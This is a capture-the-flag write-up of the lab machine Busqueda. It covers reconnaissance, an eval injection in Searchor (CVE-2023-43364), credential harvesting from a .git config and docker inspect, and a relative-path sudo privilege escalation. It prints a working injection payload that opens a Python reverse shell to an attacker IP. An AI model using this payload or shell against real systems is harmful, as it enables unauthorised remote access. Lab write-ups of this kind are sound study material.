+++
title = 'Busqueda'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan
![Busqueda (Easy Linux).png](Busqueda%20%28Easy%20Linux%29.png)
Port 22 - ssh - OpenSSH 8.9p1 Ubuntu
Port 80 - Apacher 2.4.52

Going to http://10.129.228.217/ we get a redirect to http://searcher.htb

Add to hosts file

Going to http://searcher.htb - we see a "search" thing where you can select a search engine and a query which outputs a url to the corresponding search engine

bottom of page:
![Busqueda (Easy Linux)-1.png](Busqueda%20%28Easy%20Linux%29-1.png)

I see flask and the /search page has the query within the url so my spidey senses tell me potentially Server-Side Template Injection

https://nvd.nist.gov/vuln/detail/cve-2023-43364
main.py in Searchor before 2.4.2 uses eval on CLI input, which may cause unexpected code execution.

CVE-2023-43364 is related to the following code in main.py of searchor
![Busqueda (Easy Linux)-2.png](Busqueda%20%28Easy%20Linux%29-2.png)

```python
url = eval(
	f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)

# So essentially we can change the query value above

# After playing around a bit, this is what allows python commands to run
# Note - eval() does not allow ; character - so you have to use exec()

def func(a,b,c):
    print(f"{a},{b},{c}")

query="',exec(print(10)))#"
engine="e"
copy="c"

eval(f"func('{engine}','{query}','{copy}')")

# so the following should work as a payload
# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
',exec("PYTHON_CODE"))#

',exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.196',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```
![Busqueda (Easy Linux)-4.png](Busqueda%20%28Easy%20Linux%29-4.png)

![Busqueda (Easy Linux)-3.png](Busqueda%20%28Easy%20Linux%29-3.png)

![Busqueda (Easy Linux)-5.png](Busqueda%20%28Easy%20Linux%29-5.png)

We see a config file in the .git directory which contains some creds
![Busqueda (Easy Linux)-6.png](Busqueda%20%28Easy%20Linux%29-6.png)

`cody:jh1usoih2bkjaspwe92`

but.....looking at the /etc/passwd file, there is no cody user - there seems to just be a `_laurel` user

nvm svc has a home directory with user.txt
![Busqueda (Easy Linux)-7.png](Busqueda%20%28Easy%20Linux%29-7.png)

those creds in the .git file actually are the password for the current user `svc`

![Busqueda (Easy Linux)-8.png](Busqueda%20%28Easy%20Linux%29-8.png)

We can run `python3 /opt/scripts/system-checkup.py` with at least 1 argument as `root`
![Busqueda (Easy Linux)-9.png](Busqueda%20%28Easy%20Linux%29-9.png)

![Busqueda (Easy Linux)-10.png](Busqueda%20%28Easy%20Linux%29-10.png)
`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq`
run this to see data - from https://docs.docker.com/engine/cli/formatting/

![Busqueda (Easy Linux)-11.png](Busqueda%20%28Easy%20Linux%29-11.png)

`gitea`
`yuiu1hoiu4i5ho1uh`

Go to http://gitea.searcher.htb and sign in page
![Busqueda (Easy Linux)-12.png](Busqueda%20%28Easy%20Linux%29-12.png)

![Busqueda (Easy Linux)-13.png](Busqueda%20%28Easy%20Linux%29-13.png)
signing in as cody worked - we can see another user `administrator`

Use password we got for gitea

![Busqueda (Easy Linux)-14.png](Busqueda%20%28Easy%20Linux%29-14.png)

change code for system-checkup.py

we could not change code because server is blocking it - seems like we cant commit to the files or create new files

Looking at the system-checkup.py code - we see the relative path being used:

![Busqueda (Easy Linux)-15.png](Busqueda%20%28Easy%20Linux%29-15.png)

![Busqueda (Easy Linux)-16.png](Busqueda%20%28Easy%20Linux%29-16.png)

make our own .sh in  home directory with reverse shell back to attack machine
![Busqueda (Easy Linux)-17.png](Busqueda%20%28Easy%20Linux%29-17.png)

